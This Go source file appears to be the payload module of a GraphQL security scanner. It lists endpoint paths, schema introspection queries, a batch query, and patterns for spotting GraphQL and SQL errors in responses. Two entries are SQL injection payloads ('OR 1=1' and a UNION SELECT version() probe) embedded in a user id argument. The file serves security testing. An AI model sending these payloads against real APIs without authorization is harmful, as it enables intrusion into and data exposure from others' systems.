package payloads

// CommonGraphQLPaths contains a list of commonly used paths for GraphQL endpoints.
var CommonGraphQLPaths = []string{
	"/graphql",
	"/api/graphql",
	"/graphql/v1",
	"/graphql/v2",
	"/api",
	"/query",
	"/graph",
	"/graphql.php",
	"/graphql.json",
}

// GraphQLQueries contains a collection of common GraphQL queries used for testing.
var GraphQLQueries = struct {
	// Introspection queries are used to discover the schema of a GraphQL API.
	IntrospectionSimple string
	IntrospectionFull   string
	
	// Common queries are basic queries to test endpoint functionality.
	GetTypeName  string
	GetSchema    string
	
	// SQL Injection test queries are designed to probe for SQLi vulnerabilities within GraphQL.
	SQLiBasic    string
	SQLiUnion    string
	
	// Field Suggestion queries are used to enumerate available fields in the schema.
	GetAllFields string
	
	// Batch query for testing batching attacks or performance.
	BatchQuery   string
}{
	// IntrospectionSimple is a minimal introspection query to confirm GraphQL endpoint existence.
	IntrospectionSimple: `{"query":"{__typename}"}`,
	
	// IntrospectionFull is a comprehensive introspection query to retrieve the full schema.
	IntrospectionFull: `{
		"query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...TypeRef } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }"
	}`,

	// GetTypeName is a simple query to retrieve the type name of the root query.
	GetTypeName: `{"query":"{ __typename }"}`,
	
	// GetSchema is a query to retrieve basic schema information (types and fields).
	GetSchema: `{"query":"{ __schema { types { name fields { name type { name kind ofType { name kind } } } } }"}`,
	
	// SQLiBasic is a basic SQL Injection test query for GraphQL.
	SQLiBasic: `{"query":"{ user(id: \"1' OR '1'='1\") { id username } }"}`,
	// SQLiUnion is a UNION-based SQL Injection test query for GraphQL.
	SQLiUnion: `{"query":"{ user(id: \"1' UNION SELECT null,version()--\") { id username } }"}`,
	
	// GetAllFields is a query to enumerate all fields of the Query type.
	GetAllFields: `{"query":"{ __type(name: \"Query\") { fields { name type { name kind ofType { name kind } } } } }"}`,
	
	// BatchQuery is an example of a batched GraphQL query.
	BatchQuery: `[
		{"query": "{ __typename }"},
		{"query": "{ __schema { types { name } } }"}
	]`,
}

// GraphQLResponseKeywords are keywords searched in the response to confirm a GraphQL endpoint.
var GraphQLResponseKeywords = []string{
	"__typename",
	"GraphQL",    // Often appears in error messages.
	"data",
	"errors",
	"extensions",
}

// GraphQLErrorPatterns are common error patterns found in GraphQL responses.
var GraphQLErrorPatterns = []string{
	"Cannot query field",
	"Syntax Error",
	"No query string",
	"Must provide query string",
}

// GraphQLVulnerabilityPatterns contains patterns indicating specific GraphQL vulnerabilities.
var GraphQLVulnerabilityPatterns = struct {
	SQLInjection []string // Patterns indicating SQL Injection.
	ErrorBased   []string // Patterns indicating generic error-based vulnerabilities.
}{
	SQLInjection: []string{
		"SQL syntax",
		"syntax error",
		"mysql",
		"postgres",
		"sqlite",
		"ORA-", // Oracle error.
	},
	ErrorBased: []string{
		"error in your SQL syntax",
		"unexpected end of SQL command",
		"syntax error at or near",
	},
}
